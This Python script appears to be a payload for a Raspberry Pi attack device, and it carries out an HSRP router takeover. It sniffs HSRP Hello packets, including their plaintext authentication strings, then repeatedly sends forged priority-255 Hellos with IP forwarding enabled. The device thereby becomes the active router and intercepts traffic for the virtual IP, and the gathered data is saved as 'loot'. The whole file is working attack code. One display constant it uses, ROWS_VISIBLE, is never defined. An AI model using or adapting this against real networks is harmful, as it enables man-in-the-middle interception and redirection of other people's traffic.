#!/usr/bin/env python3
"""
RaspyJack Payload -- HSRP Takeover
=====================================
Author: 7h30th3r0n3

HSRP (Hot Standby Router Protocol) takeover.
Sniffs HSRP Hello packets to learn group, priority, and VIP, then
crafts Hello with priority 255 to become the active router.

Flow:
  1) Sniff HSRP Hello on UDP 1985 / multicast 224.0.0.2
  2) Learn group ID, virtual IP, current active router, priority
  3) Craft HSRP Hello with priority 255 (highest)
  4) Pi becomes active router, receives all VIP-destined traffic

Controls:
  OK        -- Start takeover
  UP / DOWN -- Scroll group info
  KEY1      -- Sniff-only mode (passive recon)
  KEY2      -- Export data
  KEY3      -- Exit + stop

Loot: /root/Raspyjack/loot/HSRPTakeover/

Setup: Target network must use HSRP. Requires IP forwarding.
"""

import os
import sys
import time
import json
import struct
import socket
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        sniff, send, sendp, IP, UDP, Ether, Raw, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/HSRPTakeover"
os.makedirs(LOOT_DIR, exist_ok=True)
HSRP_PORT = 1985
HSRP_MCAST = "224.0.0.2"

# HSRP states
HSRP_STATES = {
    0: "Initial", 1: "Learn", 2: "Listen",
    4: "Speak", 8: "Standby", 16: "Active",
}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
hsrp_groups = {}        # group_id -> {vip, priority, active_router, auth, state, hello_time, hold_time}
status_msg = "Ready"
scroll_pos = 0
sniff_only = False
takeover_active = False
takeover_group = -1
app_running = True
hello_sent = 0
my_ip = ""
my_iface = ""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _get_default_iface():
    try:
        r = subprocess.run(["ip", "route", "show", "default"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_my_ip(iface):
    try:
        r = subprocess.run(["ip", "-4", "addr", "show", "dev", iface],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return "0.0.0.0"


def _enable_ip_forward():
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
                   capture_output=True, timeout=5)


def _disable_ip_forward():
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
                   capture_output=True, timeout=5)


# ---------------------------------------------------------------------------
# HSRP packet parsing
# ---------------------------------------------------------------------------

def _parse_hsrp(payload):
    """Parse HSRP Hello from raw UDP payload."""
    # HSRP v1 format (20 bytes minimum):
    # 0: version, 1: opcode, 2: state, 3: hellotime
    # 4: holdtime, 5: priority, 6: group, 7: reserved
    # 8-15: authentication (8 bytes)
    # 16-19: virtual IP
    if len(payload) < 20:
        return None
    version = payload[0]
    opcode = payload[1]
    state = payload[2]
    hello_time = payload[3]
    hold_time = payload[4]
    priority = payload[5]
    group = payload[6]
    auth = payload[8:16].decode("ascii", errors="ignore").rstrip("\x00")
    vip = socket.inet_ntoa(payload[16:20])
    return {
        "version": version,
        "opcode": opcode,
        "state": state,
        "hello_time": hello_time,
        "hold_time": hold_time,
        "priority": priority,
        "group": group,
        "auth": auth if auth else "cisco",
        "vip": vip,
    }


def _build_hsrp_hello(group, priority, vip, auth="cisco", hello=3, hold=10):
    """Build an HSRP Hello packet payload."""
    # Version=0, Opcode=0 (Hello), State=16 (Active)
    payload = struct.pack("B", 0)       # version
    payload += struct.pack("B", 0)      # opcode (hello)
    payload += struct.pack("B", 16)     # state (active)
    payload += struct.pack("B", hello)  # hellotime
    payload += struct.pack("B", hold)   # holdtime
    payload += struct.pack("B", priority)  # priority
    payload += struct.pack("B", group)  # group
    payload += struct.pack("B", 0)      # reserved
    # Authentication (8 bytes, padded)
    auth_bytes = auth.encode("ascii")[:8].ljust(8, b"\x00")
    payload += auth_bytes
    # Virtual IP
    payload += socket.inet_aton(vip)
    return payload


def _packet_handler(pkt):
    """Process sniffed HSRP packets."""
    if not pkt.haslayer(UDP) or not pkt.haslayer(IP):
        return
    udp = pkt[UDP]
    if udp.dport != HSRP_PORT:
        return

    payload = bytes(udp.payload)
    parsed = _parse_hsrp(payload)
    if not parsed:
        return

    src_ip = pkt[IP].src
    group = parsed["group"]

    with lock:
        entry = hsrp_groups.get(group, {})
        entry["vip"] = parsed["vip"]
        entry["priority"] = parsed["priority"]
        entry["active_router"] = src_ip
        entry["auth"] = parsed["auth"]
        entry["state"] = HSRP_STATES.get(parsed["state"], f"Unk({parsed['state']})")
        entry["hello_time"] = parsed["hello_time"]
        entry["hold_time"] = parsed["hold_time"]
        entry["last_seen"] = datetime.now().strftime("%H:%M:%S")
        new_groups = dict(hsrp_groups)
        new_groups[group] = entry
        hsrp_groups.clear()
        hsrp_groups.update(new_groups)


def _sniff_thread():
    """Sniff HSRP traffic."""
    global status_msg
    with lock:
        status_msg = "Sniffing HSRP..."
    try:
        sniff(
            filter="udp port 1985",
            prn=_packet_handler,
            store=False,
            stop_filter=lambda _: not app_running,
        )
    except Exception as exc:
        with lock:
            status_msg = f"Sniff err: {exc}"


# ---------------------------------------------------------------------------
# Takeover thread
# ---------------------------------------------------------------------------

def _takeover_thread(group_id):
    """Send HSRP Hello with priority 255 continuously."""
    global hello_sent, takeover_active, status_msg

    with lock:
        info = hsrp_groups.get(group_id, {})
    vip = info.get("vip", "0.0.0.0")
    auth = info.get("auth", "cisco")
    hello_t = info.get("hello_time", 3)

    _enable_ip_forward()

    with lock:
        takeover_active = True
        status_msg = f"Takeover grp {group_id}..."

    while app_running and takeover_active:
        try:
            hsrp_payload = _build_hsrp_hello(group_id, 255, vip, auth, hello_t)
            pkt = (
                IP(src=my_ip, dst=HSRP_MCAST, ttl=1)
                / UDP(sport=HSRP_PORT, dport=HSRP_PORT)
                / Raw(load=hsrp_payload)
            )
            send(pkt, verbose=False)
            with lock:
                hello_sent += 1
        except Exception:
            pass
        time.sleep(hello_t)

    _disable_ip_forward()


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_data():
    global status_msg
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "my_ip": my_ip,
            "hello_sent": hello_sent,
            "groups": {str(k): v for k, v in hsrp_groups.items()},
        }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"hsrp_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            status_msg = "Exported to loot"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)
    draw.text((2, 2), "HSRP TAKEOVER", fill="RED", font=font)

    with lock:
        st = status_msg
        grps = dict(hsrp_groups)
        sp = scroll_pos
        hs = hello_sent
        ta = takeover_active
        so = sniff_only

    mode = "SNIFF" if so else ("ACTIVE" if ta else "IDLE")
    mode_color = "GREEN" if ta else ("CYAN" if so else "GRAY")
    draw.text((90, 2), mode, fill=mode_color, font=font)
    draw.text((2, 14), st[:22], fill="WHITE", font=font)

    y = 28
    group_ids = sorted(grps.keys())
    for gid in group_ids[sp:sp + ROWS_VISIBLE]:
        info = grps[gid]
        vip = info.get("vip", "?")
        pri = info.get("priority", 0)
        state = info.get("state", "?")[:6]
        color = "YELLOW" if gid == takeover_group else "WHITE"
        line = f"G{gid} VIP:{vip} P:{pri} {state}"
        draw.text((2, y), line[:22], fill=color, font=font)
        y += 14

    if not group_ids:
        draw.text((2, 56), "No HSRP groups found", fill="GRAY", font=font)

    if ta:
        draw.text((2, 100), f"Hello sent: {hs}", fill="GREEN", font=font)

    draw.text((2, 116), "OK=take K1=sniff K3=ex", fill="GRAY", font=font)
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global app_running, sniff_only, takeover_active, takeover_group
    global scroll_pos, status_msg, my_ip, my_iface

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="RED")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return

    my_iface = _get_default_iface()
    my_ip = _get_my_ip(my_iface)

    try:
        # Start passive sniffing
        threading.Thread(target=_sniff_thread, daemon=True).start()
        _draw_screen()

        while app_running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                app_running = False
                break

            elif btn == "OK":
                if sniff_only:
                    with lock:
                        status_msg = "Sniff-only mode"
                elif not takeover_active:
                    with lock:
                        gids = sorted(hsrp_groups.keys())
                    if gids:
                        takeover_group = gids[min(scroll_pos, len(gids) - 1)]
                        threading.Thread(
                            target=_takeover_thread,
                            args=(takeover_group,), daemon=True,
                        ).start()
                    else:
                        with lock:
                            status_msg = "No groups to attack"
                else:
                    takeover_active = False
                    _disable_ip_forward()
                    with lock:
                        status_msg = "Takeover stopped"

            elif btn == "UP":
                with lock:
                    if scroll_pos > 0:
                        scroll_pos -= 1

            elif btn == "DOWN":
                with lock:
                    max_s = max(0, len(hsrp_groups) - ROWS_VISIBLE)
                    if scroll_pos < max_s:
                        scroll_pos += 1

            elif btn == "KEY1":
                sniff_only = not sniff_only
                if sniff_only and takeover_active:
                    takeover_active = False
                    _disable_ip_forward()
                with lock:
                    status_msg = "Sniff only" if sniff_only else "Attack ready"

            elif btn == "KEY2":
                threading.Thread(target=_export_data, daemon=True).start()

            _draw_screen()
            time.sleep(0.15)

    finally:
        app_running = False
        takeover_active = False
        _disable_ip_forward()
        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            d = ScaledDraw(img)
            d.text((10, 50), "HSRP stopped", fill="YELLOW", font=font)
            d.text((10, 66), f"Hellos: {hello_sent}", fill="WHITE", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass
        GPIO.cleanup()


if __name__ == "__main__":
    main()
